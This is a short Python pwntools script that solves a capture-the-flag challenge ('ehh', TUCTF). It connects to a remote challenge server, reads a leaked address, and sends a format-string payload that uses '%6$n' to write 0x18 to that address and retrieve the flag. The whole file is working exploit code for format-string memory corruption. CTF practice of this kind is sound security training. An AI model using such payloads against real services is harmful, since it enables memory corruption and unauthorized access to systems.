from pwn import *

context(arch='i386', os='linux')
# p = process('./ehh')
p = remote('18.222.213.102', 12345)

p.recvuntil('here< ')
leak = p.recvuntil('\n').strip()
leak = int(leak, 16)

target_len = 0x18
target_fmt = '%6$n'
buf_fmt = '%{}x'
payload = ''
payload += p32(leak)
payload += buf_fmt.format(target_len - len(payload))
payload += target_fmt

p.sendline(payload)
p.recvuntil('TUCTF')
flag =  'TUCTF' + p.recvuntil('\n')
log.success(flag)
